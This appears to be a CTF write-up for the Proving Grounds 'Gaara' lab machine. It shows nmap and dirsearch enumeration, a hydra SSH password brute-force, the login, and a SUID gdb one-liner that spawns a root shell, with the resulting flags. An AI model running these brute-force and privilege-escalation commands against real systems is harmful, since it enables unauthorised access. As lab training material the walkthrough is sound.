
# Recon

```console
root@kali:/OSCPv3/offsec_pg/Gaara# nmap -Pn -sT -sV -n 192.168.222.142 -p- --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-04 13:10 CST
Warning: 192.168.222.142 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.222.142
Host is up (0.083s latency).
Not shown: 55693 closed ports, 9840 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.27 seconds
```

## HTTP TCP/80

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Gaara/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/Gaara# python3 /opt/dirsearch/dirsearch.py -u http://192.168.222.142/ -w /usr/share/dirb/wordlists/common.txt -e php,txt,cgi

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, cgi | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /opt/dirsearch/logs/errors-21-11-04_13-22-58.log

Target: http://192.168.222.142/

[13:22:58] Starting: 
[13:22:59] 200 -  137B  - /
[13:22:59] 403 -  280B  - /.hta
[13:23:25] 200 -  137B  - /index.html
[13:23:52] 403 -  280B  - /server-status

Task Completed
```


```console
root@kali:/OSCPv3/offsec_pg/Gaara# python3 /opt/dirsearch/dirsearch.py -u http://192.168.222.142/ -w /usr/share/dirb/wordlists/big.txt -e php,txt,cgi

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, cgi | HTTP method: get | Threads: 10 | Wordlist size: 20469

Error Log: /opt/dirsearch/logs/errors-21-11-04_13-24-33.log

Target: http://192.168.222.142/

[13:24:34] Starting: 
[13:28:24] 403 -  280B  - /server-status

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Gaara# time python3 /opt/dirsearch/dirsearch.py -u http://192.168.222.142/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e php,txt,cgi

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, cgi | HTTP method: get | Threads: 10 | Wordlist size: 1273424

Error Log: /opt/dirsearch/logs/errors-21-11-04_13-55-00.log

Target: http://192.168.222.142/

[13:55:00] Starting: 
[13:55:01] 200 -  137B  - /
[14:19:41] 403 -  280B  - /server-status
[14:30:20] 200 -  327B  - /Cryoserver
CTRL+C detected: Pausing threads, please wait...
[e]xit / [c]ontinue: e

Canceled by the user
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Gaara/img/2.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Gaara/img/3.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Gaara/img/4.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Gaara/img/5.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Gaara/img/66.png)

To view f1MgN9mTf9SNbzRygcU


![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Gaara/img/7.png)


https://www.dcode.fr/cipher-identifier

https://gchq.github.io/CyberChef/

gaara:ismyname


# Explotation

```console
root@kali:/OSCPv3/offsec_pg/Gaara# hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.222.142
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-11-04 15:18:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:0), ~14344399 tries per task
[DATA] attacking ssh://192.168.222.142:22/
[22][ssh] host: 192.168.222.142   login: gaara   password: iloveyou2
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:00h, 0 to do in 01:00h, 2 active
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2021-11-04 15:19:30
```


```console
root@kali:/OSCPv3/offsec_pg/Gaara# ssh gaara@192.168.222.142
gaara@192.168.222.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ 
gaara@Gaara:~$ cat local.txt 
3e80c5040aa15605080f39fdb14458e4
```

# Privilege escalation


```console
gaara@Gaara:/home$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
gaara:x:1001:1001:,,,:/home/gaara:/bin/bash
```


```console
gaara@Gaara:/home$ sudo -l
sudo: unable to resolve host Gaara: Name or service not known
[sudo] password for gaara: 
Sorry, user gaara may not run sudo on Gaara.
```

```console
gaara@Gaara:/home$ ls -la /etc/passwd
-rw-r--r-- 1 root root 1478 Dec 13  2020 /etc/passwd
gaara@Gaara:/home$ ls -la /etc/shadow
-rw-r----- 1 root shadow 975 Apr 27  2021 /etc/shadow
```

```console
gaara@Gaara:/home$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

https://gtfobins.github.io/gtfobins/gdb/#suid


```console
gaara@Gaara:/var/www/html$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
# cd /root
# ls
proof.txt  root.txt
# cat root
cat: root: No such file or directory
# cat root.txt
Your flag is in another file...
# cat proof.txt	
3887f1a624f1927840e50f3ac8b14fb7
```



